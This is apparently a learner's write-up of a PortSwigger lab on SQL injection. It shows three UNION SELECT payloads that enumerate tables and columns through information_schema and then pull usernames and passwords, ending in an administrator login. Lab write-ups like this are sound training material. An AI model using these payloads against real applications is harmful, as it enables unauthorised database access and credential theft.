# Lab 08 — SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases

**Difficulty:** Practitioner  
**Category:** SQL Injection — Examining the Database  
**Platform:** PortSwigger Web Security Academy

---

## What the lab is

You don't always know the table and column names upfront. This lab covers how to enumerate the database schema — finding what tables and columns exist — before extracting data.

---

## The vulnerability

Most databases have an information schema — a built-in set of tables that describe the structure of the database itself. If you can query that, you can map out the entire DB.

---

## What I did

**Step 1 — list all tables:**

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

This returned a list of all tables in the database. Spotted one called `users_abcxyz` (the lab randomises the name).

**Step 2 — list columns in that table:**

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcxyz'--
```

Returned column names — found `username_abc` and `password_abc`.

**Step 3 — extract the data:**

```
' UNION SELECT username_abc,password_abc FROM users_abcxyz--
```

Got administrator credentials, logged in.

---

## Key takeaway

`information_schema` is your map of the database. It exists on PostgreSQL, MySQL, MSSQL — basically everything except Oracle (which uses `all_tables` and `all_columns` instead). Real world targets won't have tables called `users` — you always need to enumerate first.
